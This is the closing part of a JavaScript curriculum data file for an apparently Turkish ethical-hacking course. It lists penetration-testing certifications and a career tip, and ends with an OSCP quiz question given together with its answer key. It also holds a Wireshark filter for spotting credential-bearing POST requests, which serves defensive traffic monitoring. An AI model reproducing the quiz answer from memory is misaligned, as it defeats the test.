- **eJPT (eLearnSecurity Junior Penetration Tester):** Sektöre ilk giriş için en iyi pratik sınavdır. 48 saatlik mini sızma testi içerir.
- **OSCP (Offensive Security Certified Professional):** Endüstrinin altın standardıdır. 24 saatlik canlı sızma testi ve raporlama gerektirir.
- **PNPT (Practical Network Penetration Tester - TCM Security):** Gerçek hayat OSINT ve Active Directory odaklı pratik sertifikasyon.
- **CompTIA Security+:** Kurumsal temel ve teorik altyapı için dünya çapında geçerli başlangıç sertifikası.`,
        codeSnippet: `# Wireshark Filtresi: Şüpheli HTTP POST isteklerini ve credential denemelerini bulma
http.request.method == "POST" && (http contains "password" || http contains "admin")`,
        tip: "Kariyerin başında her gün TryHackMe ve HackTheBox çözmek, laboratuvar raporları hazırlamak ve LinkedIn/GitHub'da paylaşmak doğrudan iş teklifleri getirir."
      }
    ],
    quiz: {
      question: "24 saatlik uygulamalı laboratuvar ortamında sunucuları hackleyip ardından profesyonel pentest raporu yazmayı zorunlu kılan ünlü etik hacker sertifikası hangisidir?",
      options: [
        "OSCP (Offensive Security)",
        "CEH (Theoretical Exam)",
        "ITIL Foundation",
        "CCNA Routing"
      ],
      correct: 0,
      explanation: "OSCP, 24 saat kesintisiz pratik sızma testi ve sonrasında 24 saatlik detaylı raporlama süresiyle sektördeki en saygın hands-on etik hackerlık sertifikasıdır."
    }
  }
];

if (typeof module !== "undefined" && module.exports) {
  module.exports = { CURRICULUM_DATA };
}
